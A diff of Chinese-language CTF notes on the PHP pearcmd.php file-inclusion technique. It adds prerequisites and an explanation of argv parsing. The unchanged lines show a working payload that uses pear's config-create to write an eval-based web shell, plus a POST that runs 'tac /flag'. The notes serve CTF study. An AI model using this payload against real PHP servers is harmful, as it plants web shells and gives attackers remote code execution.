@@ -29,7 +29,10 @@
 
 > pear全称PHP Extension and Application Repository，php扩展和应用仓库，在docker中默认安装，路径为/user/local/lib/php.
 >
-> 前提需要：`register_argc_argv` 是 `on`
+> 前提需要：
+> - 安装了pear（这样才能有pearcmd.php）
+- 开启了`register_argc_argv`
+- 存在文件包含且可以包含后缀为php的文件且没有`open_basedir`的限制。
 
 ```php
 ?+config-create+/&file=/usr/local/lib/php/pearcmd&/<?=@eval($_POST['cmd']);?>+shel.php
@@ -40,6 +43,7 @@
 - `?+config-create+/`
 
 > pear工具里有一个命令叫:config-create,这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。
+
 
 - `&file=/usr/local/lib/php/pearcmd&/<?=@eval($_POST['cmd']);?>`
 
@@ -63,8 +67,17 @@ cmd=system('tac /flag');
 
 
 
-
+### pear.php补充
+首先是这个参数`$_SERVER['argv']`
+```php
+<?php  
+var_dump($_SERVER['argv']);
+//首先是这个参数$_SERVER['argv']
+```
+通过+作为分隔符：
+![image-20240910225036767](https://gitee.com/bx33661/image/raw/master/path/image-20240910225036767.png)
 
 ### 参考文档
 
 https://juejin.cn/post/7147638903191814180
+https://blog.csdn.net/rfrder/article/details/121042290
